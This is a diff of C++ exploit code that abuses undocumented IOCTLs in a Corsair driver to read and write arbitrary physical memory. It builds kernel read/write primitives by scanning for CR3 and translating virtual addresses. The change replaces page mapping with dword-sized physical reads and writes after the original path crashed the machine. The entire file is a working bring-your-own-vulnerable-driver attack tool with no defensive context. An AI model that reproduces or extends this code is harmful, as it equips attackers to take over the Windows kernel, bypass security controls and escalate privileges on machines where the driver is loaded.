@@ -31,6 +31,11 @@ static constexpr DWORD CORSAIR_IOCTL_MAP_IO_SPACE   = 0x225374;
 static constexpr DWORD CORSAIR_IOCTL_UNMAP_IO_SPACE = 0x229378;
 static constexpr DWORD CORSAIR_IOCTL_READ_MSR       = 0x225388;
 static constexpr DWORD CORSAIR_IOCTL_WRITE_MSR      = 0x229384;
+// sub_14000185C: MmMapIoSpace + copy 1/2/4 + MmUnmapIoSpace. No user MDL.
+// The 0x225374/0x229378 pair MmUnmapLockedPages and bugchecked 0x4E
+// (MiDoubleUnlockMdlPage) on this VM. Dumps 111326-13265 and 111326-9453.
+static constexpr DWORD CORSAIR_IOCTL_PHYS_WRITE     = 0x22934C;
+static constexpr DWORD CORSAIR_IOCTL_PHYS_READ      = 0x229350;
 
 #pragma pack(push, 1)
 struct CORSAIR_MAP_PARAMS {
@@ -78,40 +83,51 @@ static int CorsairSehMemcpyWrite(void* dst, const void* src, size_t n) {
     __except(EXCEPTION_EXECUTE_HANDLER) { return 0; }
 }
 
+// PA is the low 32 bits. Value sits in the high half of that qword. Size is a word at +8.
+// inLen must be >= 0xA. Read copies the dword back over the start of the buffer.
+static bool CorsairRw32(HANDLE h, uint64_t pa, uint32_t* val, bool write) {
+    if (!val || pa > 0xFFFFFFFCu) return false;
+    uint8_t buf[12]{};
+    *reinterpret_cast<uint32_t*>(buf) = (uint32_t)pa;
+    if (write) *reinterpret_cast<uint32_t*>(buf + 4) = *val;
+    *reinterpret_cast<uint16_t*>(buf + 8) = 4;
+    DWORD got = 0;
+    const DWORD code = write ? CORSAIR_IOCTL_PHYS_WRITE : CORSAIR_IOCTL_PHYS_READ;
+    if (!DeviceIoControl(h, code, buf, 10, buf, 10, &got, nullptr))
+        return false;
+    if (!write) *val = *reinterpret_cast<uint32_t*>(buf);
+    return true;
+}
+
 static bool CorsairPhysRead(HANDLE h, uint64_t pa, void* dst, size_t size) {
-    uint8_t* d = (uint8_t*)dst;
+    auto* d = static_cast<uint8_t*>(dst);
     size_t off = 0;
     while (off < size) {
-        uint64_t pageBase = (pa + off) & ~0xFFFULL;
-        uint32_t pageOff  = (uint32_t)((pa + off) & 0xFFF);
-        uint32_t chunk    = (uint32_t)std::min(size - off, (size_t)(0x1000 - pageOff));
-
-        void* mapped = CorsairMapPhys(h, pageBase, 0x1000);
-        if (!mapped) return false;
-
-        int ok = CorsairSehMemcpyRead(d + off, (uint8_t*)mapped + pageOff, chunk);
-        CorsairUnmapPhys(h, mapped);
-        if (!ok) return false;
-        off += chunk;
+        uint64_t aligned = (pa + off) & ~3ull;
+        uint32_t skip = (uint32_t)((pa + off) & 3);
+        uint32_t word = 0;
+        if (!CorsairRw32(h, aligned, &word, false)) return false;
+        size_t n = std::min(size - off, (size_t)(4 - skip));
+        memcpy(d + off, reinterpret_cast<uint8_t*>(&word) + skip, n);
+        off += n;
     }
     return true;
 }
 
 static bool CorsairPhysWrite(HANDLE h, uint64_t pa, const void* src, size_t size) {
-    const uint8_t* s = (const uint8_t*)src;
+    const auto* s = static_cast<const uint8_t*>(src);
     size_t off = 0;
     while (off < size) {
-        uint64_t pageBase = (pa + off) & ~0xFFFULL;
-        uint32_t pageOff  = (uint32_t)((pa + off) & 0xFFF);
-        uint32_t chunk    = (uint32_t)std::min(size - off, (size_t)(0x1000 - pageOff));
-
-        void* mapped = CorsairMapPhys(h, pageBase, 0x1000);
-        if (!mapped) return false;
-
-        int ok = CorsairSehMemcpyWrite((uint8_t*)mapped + pageOff, s + off, chunk);
-        CorsairUnmapPhys(h, mapped);
-        if (!ok) return false;
-        off += chunk;
+        uint64_t aligned = (pa + off) & ~3ull;
+        uint32_t skip = (uint32_t)((pa + off) & 3);
+        uint32_t word = 0;
+        if (skip || (size - off) < 4) {
+            if (!CorsairRw32(h, aligned, &word, false)) return false;
+        }
+        size_t n = std::min(size - off, (size_t)(4 - skip));
+        memcpy(reinterpret_cast<uint8_t*>(&word) + skip, s + off, n);
+        if (!CorsairRw32(h, aligned, &word, true)) return false;
+        off += n;
     }
     return true;
 }
@@ -123,15 +139,17 @@ static uint64_t CorsairRead8(HANDLE h, uint64_t pa) {
     return v;
 }
 
-// One MAP+UNMAP per physical page — CR3 scan used hundreds of 8-byte maps per page.
+// Copy a page with the dword IOCTL. Do not map it into this process.
 static bool CorsairVisitPhysPage(HANDLE h, uint64_t pagePa,
         const std::function<bool(const uint8_t* page)>& visit) {
     pagePa &= ~0xFFFULL;
-    void* mapped = CorsairMapPhys(h, pagePa, 0x1000);
-    if (!mapped) return false;
-    bool ok = visit((const uint8_t*)mapped);
-    CorsairUnmapPhys(h, mapped);
-    return ok;
+    uint8_t page[0x1000];
+    for (uint32_t off = 0; off < 0x1000; off += 4) {
+        uint32_t word = 0;
+        if (!CorsairRw32(h, pagePa + off, &word, false)) return false;
+        memcpy(page + off, &word, 4);
+    }
+    return visit(page);
 }
 
 static uint64_t CorsairPageRead8(const uint8_t* page, uint32_t off) {
@@ -358,7 +376,7 @@ static uint64_t CorsairBootstrapCR3(HANDLE h) {
         uint64_t hi = ranges[ri].hi & ~0xFFFULL;
         uint64_t pagesDone = 0;
         scanPageBudget(lo, hi, pagesDone, [&](uint64_t pa) -> bool {
-            if ((pa & 0xFFFFF) == 0)
+            if ((pa & 0xFFFF) == 0)
                 printf("[*]   Phase3: 0x%llx\n", (unsigned long long)pa);
             bool hit = false;
             if (!CorsairVisitPhysPage(h, pa, [&](const uint8_t* pg) -> bool {
@@ -395,7 +413,7 @@ static uint64_t CorsairBootstrapCR3(HANDLE h) {
             uint64_t hi = ranges[ri].hi & ~0xFFFULL;
             uint64_t pagesDone = 0;
             scanPageBudget(lo, hi, pagesDone, [&](uint64_t pa) -> bool {
-                if ((pa & 0xFFFFF) == 0)
+                if ((pa & 0xFFFF) == 0)
                     printf("[*]   Phase4: 0x%llx\n", (unsigned long long)pa);
                 bool hit = false;
                 if (!CorsairVisitPhysPage(h, pa, [&](const uint8_t* pg) -> bool {
@@ -543,12 +561,7 @@ static bool CorsairVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size
         size_t pageRem = 0x1000 - (pa & 0xFFF);
         size_t chunk = std::min(n, pageRem);
 
-        void* mapped = CorsairMapPhys(h, pa & ~0xFFFULL, 0x1000);
-        if (!mapped) return false;
-
-        int ok = CorsairSehMemcpyRead(d, (uint8_t*)mapped + (pa & 0xFFF), chunk);
-        CorsairUnmapPhys(h, mapped);
-        if (!ok) return false;
+        if (!CorsairPhysRead(h, pa, d, chunk)) return false;
         va += chunk; d += chunk; n -= chunk;
     }
     return true;
@@ -562,12 +575,7 @@ static bool CorsairVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* sr
         size_t pageRem = 0x1000 - (pa & 0xFFF);
         size_t chunk = std::min(n, pageRem);
 
-        void* mapped = CorsairMapPhys(h, pa & ~0xFFFULL, 0x1000);
-        if (!mapped) return false;
-
-        int ok = CorsairSehMemcpyWrite((uint8_t*)mapped + (pa & 0xFFF), s, chunk);
-        CorsairUnmapPhys(h, mapped);
-        if (!ok) return false;
+        if (!CorsairPhysWrite(h, pa, s, chunk)) return false;
         va += chunk; s += chunk; n -= chunk;
     }
     return true;
@@ -598,15 +606,14 @@ inline KernelPrimitives OpenCorsair(std::string& err)
         return {};
     }
 
-    printf("[*] Corsair smoke map 0x1000\n");
-    void* smoke = CorsairMapPhys(h, 0x1000, 0x1000);
-    printf("[*] Corsair smoke %s\n", smoke ? "ok" : "fail");
-    if (!smoke) {
+    printf("[*] Corsair smoke dword read 0x1000\n");
+    uint32_t smoke = 0;
+    if (!CorsairRw32(h, 0x1000, &smoke, false)) {
         CloseHandle(h);
-        err = "OpenCorsair: smoke test map failed (IOCTL rejected)";
+        err = "OpenCorsair: smoke dword read failed";
         return {};
     }
-    CorsairUnmapPhys(h, smoke);
+    printf("[*] Corsair smoke ok val=0x%x\n", smoke);
 
     uint64_t cr3 = CorsairBootstrapCR3(h);
     if (!cr3) {
